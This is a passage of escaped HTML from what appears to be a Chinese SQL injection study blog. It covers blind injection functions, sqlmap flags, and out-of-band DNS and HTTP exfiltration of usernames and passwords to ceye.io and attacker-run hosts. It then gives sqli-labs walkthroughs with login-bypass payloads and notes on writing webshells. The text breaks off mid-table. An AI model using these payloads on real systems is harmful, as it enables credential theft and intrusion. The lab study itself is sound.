+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;而在报错回显机制种，一旦嵌套就会详细返回列名中包含的执行语句(MySQL本身报错机制？？？)，比如&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;k&#34;&gt;select&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;exp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;~&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;select&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;from&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;select&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;version&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;())&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;));&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
+&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ERROR&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1690&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;22003&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;DOUBLE&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;value&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;is&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;out&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;of&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;range&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;in&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;exp(~((select &amp;#39;&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;29&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; from dual)))&amp;#39;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;   &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;//&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;select &amp;#39;5.5.29&amp;#39; from dual&amp;#34;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;即为列名&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/blockquote&gt;
+&lt;h2 id=&#34;bool盲注--时间型盲注&#34;&gt;bool盲注 &amp;amp; 时间型盲注&lt;/h2&gt;
+&lt;p&gt;&lt;strong&gt;盲注&lt;/strong&gt;用在不知道数据库返回值的情况下对数据内容进行猜测&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;盲注适用场景：无法直接回显获取执行结果，只能根据返回状态判断&lt;/p&gt;
+&lt;p&gt;bool型：返回 True 和 False 两种状态页面，根据页面返回不同，猜解数据&lt;/p&gt;
+&lt;p&gt;时间型：通过注入能够造成延时的特定语句，根据页面的物理反馈，来判断是否注入成功，如：在 SQL 语句中使用 sleep() 函数看加载网页的时间来判断注入点&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h3 id=&#34;常用函数&#34;&gt;常用函数&lt;/h3&gt;
+&lt;h4 id=&#34;编码转换函数&#34;&gt;编码转换函数&lt;/h4&gt;
+&lt;p&gt;ord()、ascii() ：将字符转为ascii码&lt;/p&gt;
+&lt;p&gt;char()：将ascii码转为字符&lt;/p&gt;
+&lt;h4 id=&#34;条件判断函数&#34;&gt;条件判断函数&lt;/h4&gt;
+&lt;p&gt;&lt;code&gt;if(exp1, exp2, exp3)&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;select &lt;strong&gt;case when&lt;/strong&gt; username=&amp;ldquo;admin&amp;rdquo; &lt;strong&gt;then&lt;/strong&gt; sleep(1) &lt;strong&gt;else&lt;/strong&gt; &amp;ldquo;error&amp;rdquo; &lt;strong&gt;end&lt;/strong&gt; from user&lt;/p&gt;
+&lt;h4 id=&#34;截取函数&#34;&gt;截取函数&lt;/h4&gt;
+&lt;p&gt;substr()&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;ubstr(str, pos, len) //从 pos 位置开始，截取字符串 str 的 len 长度
+substr(str from pos for length) //可以用在过滤了，的情况
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;substring()&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;substring(str, pos, len) //从 pos 位置开始，截取字符串 str 的 len 长度
+substring(str from pos for length) 
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;mid()&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;mid(str, pos, length)
+mid(str from pos for length)
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;注意点&lt;/strong&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;以上含pos参数的函数中，pos从1开始&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;left() &amp;amp; right()&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;left(str, len) 
+right(str, len)
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;正则表达式&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;select * from user where password rlike &amp;quot;^1&amp;quot;
+select * from user where password REGEXP &amp;quot;^1&amp;quot;
+select * from user where password REGEXP &amp;quot;^12&amp;quot;
+&lt;/code&gt;&lt;/pre&gt;&lt;h4 id=&#34;延时函数&#34;&gt;延时函数&lt;/h4&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;sleep(n) //挂起n秒
+
+benchmark(count, sha(1)) //实行sha(1)函数count次数，从而延时
+
+SELECT count(*) from information_schema.columns A, information_schema.columns B, information_schema.tables C; //笛卡尔积造成延时
+
+select * from users where id =1 and IF(1,concat(rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;)) RLIKE &#39;(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b&#39;,0) //用正则表达式匹配长字符制造延时
+
+rpad(string, length, rpad_string) //rpad()函数将一个字符串string用另一个字符串rpad_string在右侧填充到一定长度length
+&lt;/code&gt;&lt;/pre&gt;&lt;h4 id=&#34;其他函数&#34;&gt;其他函数&lt;/h4&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;count()
+length()
+&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;sqlmap检测各类注入&#34;&gt;sqlmap检测各类注入&lt;/h2&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;//union注入
+sqlmap -u &amp;quot;http://127.0.0.1:8888/Less-1/?id=1&amp;quot; --dbms=MySQL --random-agent --flush-session --technique=U -v 3
+
+//显错注入
+--technique=E
+
+//bool盲注
+--technique=B
+
+//时间型盲注
+--technique=T
+&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;oob注入&#34;&gt;OOB注入&lt;/h2&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;类别&lt;/th&gt;
+&lt;th&gt;注入类型&lt;/th&gt;
+&lt;th&gt;说明&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;带内&lt;/td&gt;
+&lt;td&gt;报错、union&lt;/td&gt;
+&lt;td&gt;直接回显数据&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;间接推断&lt;/td&gt;
+&lt;td&gt;bool、时间盲注&lt;/td&gt;
+&lt;td&gt;非直接回显，根据状态间接判断&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;带外&lt;/td&gt;
+&lt;td&gt;OOB&lt;/td&gt;
+&lt;td&gt;通过其他信道获取数据&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;h3 id=&#34;out-of-band&#34;&gt;Out Of Band&lt;/h3&gt;
+&lt;p&gt;带外通道技术(OOB)让攻击者能够利用其他信道获取非直接回显的漏洞。&lt;/p&gt;
+&lt;p&gt;带外通道技术通常需要让目标来生成TCP/UDP/ICMP 请求并带有敏感数据，攻击者可以通过这接收和处理这个请求来提取想要的数据。&lt;/p&gt;
+&lt;p&gt;前提：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;防火墙允许出站&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;示意图：&lt;/p&gt;
+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 231; 
+			flex-basis: 556px&#34;
+	&gt;
+	&lt;a href=&#34;https://coollllllll.github.io/p/sql/image-20220102121936554.png&#34; data-size=&#34;1213x523&#34;&gt;
+		&lt;img src=&#34;https://coollllllll.github.io/p/sql/image-20220102121936554.png&#34;
+			width=&#34;1213&#34;
+			height=&#34;523&#34;
+			srcset=&#34;https://coollllllll.github.io/p/sql/image-20220102121936554_huf7b922b0cf559b8255e9ef892f5e47d6_119869_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/sql/image-20220102121936554_huf7b922b0cf559b8255e9ef892f5e47d6_119869_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			alt=&#34;image&#34;&gt;
+	&lt;/a&gt;
+	
+	&lt;figcaption&gt;image&lt;/figcaption&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;h3 id=&#34;oob注入利用原理&#34;&gt;OOB注入利用原理&lt;/h3&gt;
+&lt;h4 id=&#34;windows中的unc路径&#34;&gt;Windows中的UNC路径&lt;/h4&gt;
+&lt;p&gt;比如Windows中访问共享文件时就会用到如下网络地址，这就是UNC路径：&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;\\192.168.33.33\haha\
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;要想带出数据还是要靠DNSLog。&lt;/p&gt;
+&lt;p&gt;load_file函数是用来读取文件内容，读取成功会返回文件内容的字符串，失败返回null。&lt;/p&gt;
+&lt;p&gt;利用方法：&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;select load_file(concat(&#39;\\\\&#39;,(select hex(concat_ws(&#39;~&#39;,username,password)) from users limit 0,1),&#39;.xxx.ceye.io\\aa&#39;))
+
+# 通过concat函数将查询结果与域名拼接形成UNC路径，调用load_file函数对UNC路径发起请求，因此成功发起DNS请求将数据外带
+&lt;/code&gt;&lt;/pre&gt;&lt;h4 id=&#34;load_file函数使用注意&#34;&gt;load_file函数使用注意&lt;/h4&gt;
+&lt;p&gt;该函数使用受 secure_file_priv 的限制，如果secure_file_priv 值为null或其他特定目录，则无法构造任意UNC路径进行利用&lt;/p&gt;
+&lt;h3 id=&#34;大文本传输技巧&#34;&gt;大文本传输技巧&lt;/h3&gt;
+&lt;p&gt;域名长度限制：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;域名由标签组成，以 &lt;code&gt;.&lt;/code&gt; 分割，标签的长度不可以超过 63 个字符&lt;/li&gt;
+&lt;li&gt;整个域名不可以超过 253 个字符，包括 &lt;code&gt;.&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;绕过限制思路：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;load_file读取内容&lt;/li&gt;
+&lt;li&gt;substr对文本内容切片&lt;/li&gt;
+&lt;li&gt;to_base64对切片后的内容编码&lt;/li&gt;
+&lt;/ol&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;k&#34;&gt;select&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;concat&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;to_base64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;substr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;load_file&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;xxx&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;10&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)),&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;.xxx.ceye.io\\a&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;as&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;result&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;oracle数据库利用oob的技巧&#34;&gt;Oracle数据库利用OOB的技巧&lt;/h3&gt;
+&lt;p&gt;Oracle 数据库中存在发起 HTTP 请求的函数 UTL_HTTP.request，它的返回类型是长度为 2000 或更短的字符串。&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;UTL_HTTP.request(url, proxy)
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;通过注入执行下列SQL语句：&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;select UTL_HTTP.request(&#39;http://ip/xxx.php&#39;||&#39;?id=&#39;||(select version from v$instance)) from dual;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;在xxx.php中接收id参数。&lt;/p&gt;
+&lt;h2 id=&#34;sql注入命令执行&#34;&gt;SQL注入——命令执行&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;dumpfile函数写shell&lt;/li&gt;
+&lt;li&gt;udf执行命令&lt;/li&gt;
+&lt;li&gt;sqlmap &amp;ndash;os-shell(本质还是webshell)&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h1 id=&#34;sqli-lab&#34;&gt;sqli-lab&lt;/h1&gt;
+&lt;h2 id=&#34;less-1&#34;&gt;Less-1&lt;/h2&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;拼接点&lt;/th&gt;
+&lt;th&gt;可用注入类型&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;SELECT * FROM users WHERE id=&#39;$id&#39; LIMIT 0,1&lt;/td&gt;
+&lt;td&gt;UNION、显错、bool盲、延时盲&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;h2 id=&#34;less-2&#34;&gt;Less-2&lt;/h2&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;拼接点&lt;/th&gt;
+&lt;th&gt;可用注入类型&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;SELECT * FROM users WHERE id=$id LIMIT 0,1&lt;/td&gt;
+&lt;td&gt;UNION、显错、bool盲、延时盲&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;与Less-1利用方式一致，闭合时候不同&lt;/p&gt;
+&lt;h2 id=&#34;less-3&#34;&gt;Less-3&lt;/h2&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;拼接点&lt;/th&gt;
+&lt;th&gt;可用注入类型&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;SELECT * FROM users WHERE id=(&#39;$id&#39;) LIMIT 0,1&lt;/td&gt;
+&lt;td&gt;UNION、显错、bool盲、延时盲&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;与Less-1利用方式一致，闭合时候不同&lt;/p&gt;
+&lt;h2 id=&#34;less-4&#34;&gt;Less-4&lt;/h2&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;$id = &#39;&amp;quot;&#39; . $id . &#39;&amp;quot;&#39;;
+$sql=&amp;quot;SELECT * FROM users WHERE id=($id) LIMIT 0,1&amp;quot;;
+&lt;/code&gt;&lt;/pre&gt;&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;拼接点&lt;/th&gt;
+&lt;th&gt;可用注入类型&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;双引号+单括号&lt;/td&gt;
+&lt;td&gt;UNION、显错、bool盲、延时盲&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;h2 id=&#34;less-5&#34;&gt;Less-5&lt;/h2&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;$sql=&amp;quot;SELECT * FROM users WHERE id=&#39;$id&#39; LIMIT 0,1&amp;quot;;
+if true:
+	打印 &#39;You are in ...&#39;;
+else:
+	print_r(mysql_error());
+&lt;/code&gt;&lt;/pre&gt;&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;拼接点&lt;/th&gt;
+&lt;th&gt;可用注入类型&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;单引号&lt;/td&gt;
+&lt;td&gt;显错、bool盲、延时盲&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;缺少回显机制，但可以依靠盲注和显错&lt;/p&gt;
+&lt;h2 id=&#34;less-6&#34;&gt;Less-6&lt;/h2&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;拼接点&lt;/th&gt;
+&lt;th&gt;可用注入类型&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;双引号&lt;/td&gt;
+&lt;td&gt;显错、bool盲、延时盲&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;缺少回显机制，可以依靠盲注和显错&lt;/p&gt;
+&lt;h2 id=&#34;less-7&#34;&gt;Less-7&lt;/h2&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;$sql=&amp;quot;SELECT * FROM users WHERE id=((&#39;$id&#39;)) LIMIT 0,1&amp;quot;;
+if true:
+	打印 &#39;You are in.... Use outfile......&#39;;
+else:
+	//print_r(mysql_error());
+&lt;/code&gt;&lt;/pre&gt;&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;拼接点&lt;/th&gt;
+&lt;th&gt;可用注入类型&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;单引号+双括号&lt;/td&gt;
+&lt;td&gt;显错、bool盲、延时盲&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;缺少回显机制和报错机制，只能依靠盲注&lt;/p&gt;
+&lt;h3 id=&#34;into-outfile&#34;&gt;into outfile&lt;/h3&gt;
+&lt;h3 id=&#34;写敏感信息&#34;&gt;写敏感信息&lt;/h3&gt;
+&lt;p&gt;前提是要知道网站根目录路径，确保写入后可以访问到&lt;/p&gt;
+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 1235; 
+			flex-basis: 2964px&#34;
+	&gt;
+	&lt;a href=&#34;https://coollllllll.github.io/p/sql/image-20210708213717904.png&#34; data-size=&#34;840x68&#34;&gt;
+		&lt;img src=&#34;https://coollllllll.github.io/p/sql/image-20210708213717904.png&#34;
+			width=&#34;840&#34;
+			height=&#34;68&#34;
+			srcset=&#34;https://coollllllll.github.io/p/sql/image-20210708213717904_hu7cc1143b2b8b63f113c758364eb7e090_13330_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/sql/image-20210708213717904_hu7cc1143b2b8b63f113c758364eb7e090_13330_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			alt=&#34;image&#34;&gt;
+	&lt;/a&gt;
+	
+	&lt;figcaption&gt;image&lt;/figcaption&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;一开始是写不进去，因为网站用户对根目录下没有写权限，尝试更改权限后成功写入&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h3 id=&#34;写shell&#34;&gt;写shell&lt;/h3&gt;
+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 1316; 
+			flex-basis: 3159px&#34;
+	&gt;
+	&lt;a href=&#34;https://coollllllll.github.io/p/sql/image-20210708214541244.png&#34; data-size=&#34;724x55&#34;&gt;
+		&lt;img src=&#34;https://coollllllll.github.io/p/sql/image-20210708214541244.png&#34;
+			width=&#34;724&#34;
+			height=&#34;55&#34;
+			srcset=&#34;https://coollllllll.github.io/p/sql/image-20210708214541244_hu07de41f1bb0479f0ef6fa31a83e711df_13984_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/sql/image-20210708214541244_hu07de41f1bb0479f0ef6fa31a83e711df_13984_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			alt=&#34;image&#34;&gt;
+	&lt;/a&gt;
+	
+	&lt;figcaption&gt;image&lt;/figcaption&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;h2 id=&#34;less-8&#34;&gt;Less-8&lt;/h2&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;拼接点&lt;/th&gt;
+&lt;th&gt;可用注入类型&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;单引号&lt;/td&gt;
+&lt;td&gt;bool盲、延时盲&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;同Less-7&lt;/p&gt;
+&lt;h2 id=&#34;less-9&#34;&gt;Less-9&lt;/h2&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;$sql=&amp;quot;SELECT * FROM users WHERE id=&#39;$id&#39; LIMIT 0,1&amp;quot;;
+if true:
+	打印 &#39;You are in....&#39;;
+else:
+	打印 &#39;You are in....&#39;;
+&lt;/code&gt;&lt;/pre&gt;&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;拼接点&lt;/th&gt;
+&lt;th&gt;可用注入类型&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;单引号&lt;/td&gt;
+&lt;td&gt;延时盲&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;无论true或false，全都打印同一字符串，无法bool盲注，只能延时盲注&lt;/p&gt;
+&lt;h2 id=&#34;less-10&#34;&gt;Less-10&lt;/h2&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;拼接点&lt;/th&gt;
+&lt;th&gt;可用注入类型&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;双引号&lt;/td&gt;
+&lt;td&gt;延时盲&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;同Less-9&lt;/p&gt;
+&lt;h2 id=&#34;less-11&#34;&gt;Less-11&lt;/h2&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;$uname=$_POST[&#39;uname&#39;];
+$passwd=$_POST[&#39;passwd&#39;];
+
+@$sql=&amp;quot;SELECT username, password FROM users WHERE username=&#39;$uname&#39; and password=&#39;$passwd&#39; LIMIT 0,1&amp;quot;;
+
+if true:
+	打印结果
+else:
+	print_r(mysql_error());
+&lt;/code&gt;&lt;/pre&gt;&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;拼接点&lt;/th&gt;
+&lt;th&gt;可用注入类型&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;POST-单引号&lt;/td&gt;
+&lt;td&gt;UNION、显错、bool盲、延时盲&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;h3 id=&#34;万能密码&#34;&gt;万能密码&lt;/h3&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;uname=admin&#39;--+&amp;amp;passwd=
+uname=admin&#39;#&amp;amp;passwd=
+
+uname=admin&amp;amp;passwd=1&#39; or 1--+&amp;amp;submit=Submit
+uname=admin&amp;amp;passwd=1&#39;||1--+&amp;amp;submit=Submit
+uname=admin&amp;amp;passwd=1&#39; or 1#&amp;amp;submit=Submit
+uname=admin&amp;amp;passwd=1&#39;||1#&amp;amp;submit=Submit
+
+uname=admin&amp;amp;passwd=1&#39;or&#39;1&#39;=&#39;1&amp;amp;submit=Submit
+uname=admin&amp;amp;passwd=1&#39;||&#39;1&#39;=&#39;1&amp;amp;submit=Submit
+&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;注意&#34;&gt;注意&lt;/h3&gt;
+&lt;p&gt;POST注入最好走bp&lt;/p&gt;
+&lt;h2 id=&#34;less-12&#34;&gt;Less-12&lt;/h2&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;拼接点&lt;/th&gt;
+&lt;th&gt;可用注入类型&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;POST-双引号+单括号&lt;/td&gt;
+&lt;td&gt;UNION、显错、bool盲、延时盲&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;与Less-11一致&lt;/p&gt;
+&lt;h2 id=&#34;less-13&#34;&gt;Less-13&lt;/h2&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;拼接点&lt;/th&gt;
+&lt;th&gt;可用注入类型&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;POST-单引号+单括号&lt;/td&gt;
